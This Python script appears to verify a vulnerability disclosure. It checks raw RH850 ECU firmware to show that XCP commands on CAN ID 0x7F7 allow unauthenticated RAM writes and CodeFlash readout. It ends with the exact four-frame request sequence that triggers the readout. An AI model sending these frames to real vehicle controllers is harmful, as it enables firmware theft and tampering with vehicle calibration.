#!/usr/bin/env python3
"""Verify the CAN 0x7F7 XCP disclosure chain from raw CodeFlash bytes."""
from __future__ import annotations

import struct
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
CF = (REPO / "firmware" / "RH850_P1M-E_CodeFlash.bin").read_bytes()

LOCAL_RAM_START = 0xFEBE0000
LOCAL_RAM_END = 0xFEBFFFFF
SHADOW_START = 0xFEBF7C00
SHADOW_END = 0xFEBFFBFF
COPY_START = 0x10000
COPY_END = 0x17DF0

passed = failed = 0


def check(label: str, condition: object, detail: str = "") -> None:
    global passed, failed
    ok = bool(condition)
    passed += int(ok)
    failed += int(not ok)
    suffix = f" ({detail})" if detail else ""
    print(f"[{'PASS' if ok else 'FAIL'}] {label}{suffix}")


def u16(offset: int) -> int:
    return struct.unpack_from("<H", CF, offset)[0]


def u32(offset: int) -> int:
    return struct.unpack_from("<I", CF, offset)[0]


def upload_allowed(start: int, length: int,
                   exclusions: list[tuple[int, int]]) -> bool:
    if length <= 0 or start > 0xFFFFFFFF - (length - 1):
        return False
    end = start + length - 1
    if LOCAL_RAM_START <= start and end <= LOCAL_RAM_END:
        return not any(start <= excluded_end and excluded_start <= end
                       for excluded_start, excluded_end in exclusions)
    return False


def shadow_write_allowed(start: int, length: int) -> bool:
    if length <= 0 or start > 0xFFFFFFFF - (length - 1):
        return False
    end = start + length - 1
    return (LOCAL_RAM_START <= start and end <= LOCAL_RAM_END
            and SHADOW_START <= start and end <= SHADOW_END)


print("== physical CAN route and command dispatch ==")
tx_record = struct.unpack_from("<IBBH", CF, 0x21F68)
rx_record = struct.unpack_from("<IBBH", CF, 0x21F70)
check("special request CAN ID is 0x7F7", rx_record[0] == 0x7F7, repr(rx_record))
check("special response CAN ID is 0x7F8", tx_record[0] == 0x7F8, repr(tx_record))
check("class-5 receive descriptor selects callback 0x82042",
      u32(0x21AC4) == 0x21F70 and u32(0x21AC8) == 0x82042)
check("receive callback reaches protocol dispatcher",
      CF[0x82062:0x82066] == bytes.fromhex("bfff82ff")
      and CF[0x8203A:0x8203E] == bytes.fromhex("bfffc6fe"))

selectors = []
targets = []
for index in range(7):
    selector, padding, target = struct.unpack_from("<B3sI", CF, 0x2B3F0 + index * 8)
    check(f"custom command record {index} has zero padding", padding == b"\0\0\0")
    selectors.append(selector)
    targets.append(target)
check("custom selectors are FB/FA/F5/F3/EB/EA/E4",
      selectors == [0xFB, 0xFA, 0xF5, 0xF3, 0xEB, 0xEA, 0xE4], repr(selectors))
check("custom callback targets match exact handler entries",
      targets == [0x9729A, 0x972FA, 0x97432, 0x97546, 0x975EE, 0x97668, 0x976F4])

print("\n== no challenge/unlock gate before memory commands ==")
command_map = CF[0x22C04:0x22C04 + CF[0x22BD1]]
callback_table = [u32(0x22C30 + index * 4) for index in range(18)]
check("CONNECT 0xFF maps to connection callback", callback_table[command_map[0]] == 0x81970)
check("SET_MTA 0xF6 maps to callback 0x81B76", callback_table[command_map[0xFF - 0xF6]] == 0x81B76)
check("DOWNLOAD 0xF0 maps to callback 0x80F12", callback_table[command_map[0xFF - 0xF0]] == 0x80F12)
check("MODIFY_BITS 0xEC maps to callback 0x80FD8", callback_table[command_map[0xFF - 0xEC]] == 0x80FD8)
check("GET_SEED 0xF8 has no configured callback", command_map[0xFF - 0xF8] == 0)
check("UNLOCK 0xF7 has no configured callback", command_map[0xFF - 0xF7] == 0)
check("CONNECT and SET_MTA require eight-byte requests", u16(0x22BA4) == 8 and u16(0x22BAC) == 8)
check("SET_MTA stores request bytes 4..7 without an authorization call",
      CF[0x81B92:0x81BA4] == bytes.fromhex("6308e0099a0d0235bfff02f6010a00527d0f"))

print("\n== RAM upload geometry ==")
exclusion_count = u32(0x2B3B8)
exclusions = [struct.unpack_from("<II", CF, 0x293F4 + index * 8)
              for index in range(exclusion_count)]
expected_exclusions = [
    (0xFEBE0000, 0xFEBE37FF),
    (0xFEBE5030, 0xFEBE529B),
    (0xFEBF0288, 0xFEBF13CB),
    (0xFEBF4958, 0xFEBF4B33),
    (0xFEBF6C00, 0xFEBF78DF),
]
check("five upload exclusions match firmware table", exclusions == expected_exclusions, repr(exclusions))
excluded_bytes = sum(end - start + 1 for start, end in exclusions)
check("107,924 LocalRAM bytes remain readable", 0x20000 - excluded_bytes == 107_924)
check("shadow start permits seven-byte upload", upload_allowed(SHADOW_START, 7, exclusions))
check("last copied byte permits one-byte upload", upload_allowed(SHADOW_START + (COPY_END - COPY_START) - 1, 1, exclusions))
check("upload crossing a protected interval is rejected", not upload_allowed(0xFEBE37FC, 8, exclusions))
check("upload wraparound is rejected", not upload_allowed(0xFFFFFFFE, 4, exclusions))

print("\n== unauthenticated RAM write geometry ==")
check("write window constants are exact 32 KiB range",
      u32(0x2B3BC) == SHADOW_START and u32(0x2B3C0) == SHADOW_END
      and SHADOW_END - SHADOW_START + 1 == 0x8000)
check("DOWNLOAD duplicate LocalRAM bounds are FEBE0000..FEBFFFFF",
      u32(0x22B8C) == LOCAL_RAM_START and u32(0x22B88) == LOCAL_RAM_END)
check("DOWNLOAD gets current MTA through 0x811A2", CF[0x80F52:0x80F56] == bytes.fromhex("80ff5002"))
check("MTA getter reads FEBE4FF4", CF[0x811A2:0x811A8] == bytes.fromhex("2457f5977f00"))
check("MTA setter writes FEBE4FF4", CF[0x8119C:0x811A2] == bytes.fromhex("6437f5977f00"))
check("DOWNLOAD invokes shadow-window validator for requested count",
      CF[0x80F66:0x80F6E] == bytes.fromhex("0a301d3880ff4210"))
check("shadow validator loads exact low/high constants",
      CF[0x9720C:0x97218] == bytes.fromhex("25f6d8740095f231a10d029d"))
check("DOWNLOAD performs direct tester-byte store through MTA",
      CF[0x80F8E:0x80FA4] == bytes.fromhex("0198dc99939f010001f0dbf1410a8100809bfd09e1f5"))
check("DOWNLOAD advances MTA to end+1",
      CF[0x80FA8:0x80FB0] == bytes.fromhex("1a36010080fff001"))
check("DOWNLOAD max CTO 8 yields payload counts 1..6",
      CF[0x22BA0] == 8
      and CF[0x80F2C:0x80F40] == bytes.fromhex("a6ef0100850fbdece0e9f2450196fefff2e9bf45"))
check("zero-length shadow write rejected", not shadow_write_allowed(SHADOW_START, 0))
check("six-byte shadow write accepted", shadow_write_allowed(SHADOW_START, 6))
check("write crossing shadow end rejected", not shadow_write_allowed(SHADOW_END - 2, 6))
check("write address wrap rejected", not shadow_write_allowed(0xFFFFFFFE, 4))

# Model repeated DOWNLOAD packets. The callback advances MTA to end+1, so a
# tester can cover the complete 0x8000-byte range using <=6-byte chunks.
write_model = bytearray(SHADOW_END - SHADOW_START + 1)
mta_write = SHADOW_START
written = 0
while written < len(write_model):
    count = min(6, len(write_model) - written)
    if not shadow_write_allowed(mta_write, count):
        break
    payload = bytes(((written + i) & 0xFF) for i in range(count))
    offset = mta_write - SHADOW_START
    write_model[offset:offset + count] = payload
    mta_write += count
    written += count
check("repeated DOWNLOAD model covers all 32 KiB", written == 0x8000)
check("repeated DOWNLOAD advances MTA exactly one byte past shadow end", mta_write == SHADOW_END + 1)
check("full-window write model changed final byte", write_model[-1] == 0xFF)

check("MODIFY_BITS gets same MTA and requires word alignment",
      CF[0x80FFC:0x81008] == bytes.fromhex("80ffa6010ae0ca060300ba2d"))
check("MODIFY_BITS validates four bytes against same write window",
      CF[0x81008:0x81014] == bytes.fromhex("0ac603000a30043a80ff9c0f"))
check("MODIFY_BITS performs in-place 32-bit read-modify-write",
      CF[0x81042:0x81050] == bytes.fromhex("19f0000d0a3041e13ce901edbfff"))

print("\n== CodeFlash-to-RAM disclosure chain ==")
check("calibration write window is exact 32 KiB shadow range", u32(0x2B3BC) == SHADOW_START and u32(0x2B3C0) == SHADOW_END)
check("E4 copy loop loads 0x10000 and stores at 0xFEBF7C00", CF[0x976D0:0x976DE] == bytes.fromhex("3e06007cbffe210600000100e505"))
check("E4 copy loop stops at 0x17DF0", CF[0x976E8:0x976F4] == bytes.fromhex("3306f07d0100f309f1f57f00"))
check("E4 request gate calls copy only for source page zero and destination page one", CF[0x97738:0x9774A] == bytes.fromhex("619a8a0d20e65a00e009da05bfff8cffa505"))
check("F5 accepts only upload lengths 1..7", CF[0x97452:0x97464] == bytes.fromhex("683a8a1d61e8e0e9b20568eab10541e29515"))
check("F5 invokes range check then copies into response bytes", CF[0x97464:0x97482] == bytes.fromhex("beff3cab0a301d38bfffeefee0518a0d20de5a0023460100bfff8affa505"))
check("F5 zeroes all eight local response bytes before copying", CF[0x97442:0x97452] == bytes.fromhex("000a0398c19953070000410a680aa6fd"))
check(
    "positive response helper emits FF then local bytes 1..7",
    CF[0x9724E:0x9727A]
    == bytes.fromhex(
        "87003e06945ebefe0706a6ff8a151f0a800b010a0190c69192970100"
        "0198de99410a680a53970000e6f57f00"
    ),
)

copy_length = COPY_END - COPY_START
shadow = bytearray(SHADOW_END - SHADOW_START + 1)
shadow[:copy_length] = CF[COPY_START:COPY_END]
mta = SHADOW_START
recovered = bytearray()
while len(recovered) < copy_length:
    chunk_length = min(7, copy_length - len(recovered))
    if not upload_allowed(mta, chunk_length, exclusions):
        break
    offset = mta - SHADOW_START
    recovered.extend(shadow[offset:offset + chunk_length])
    mta += chunk_length
check("CONNECT/E4/SET_MTA/F5 model recovers low CodeFlash byte-for-byte", bytes(recovered) == CF[COPY_START:COPY_END])
check("repeated F5 uploads advance MTA to exact copied end", mta == SHADOW_START + copy_length)

frames = {
    "connect": bytes.fromhex("ff00000000000000"),
    "copy_page": bytes.fromhex("e400000001000000"),
    "set_mta": bytes.fromhex("f6000000007cbffe"),
    "upload_7": bytes.fromhex("f507000000000000"),
}
check("minimal proof sequence uses four exact eight-byte requests", all(len(frame) == 8 for frame in frames.values()))
check("SET_MTA proof frame targets shadow start little-endian", int.from_bytes(frames["set_mta"][4:8], "little") == SHADOW_START)

print(f"\nResults: {passed} passed, {failed} failed")
raise SystemExit(1 if failed else 0)
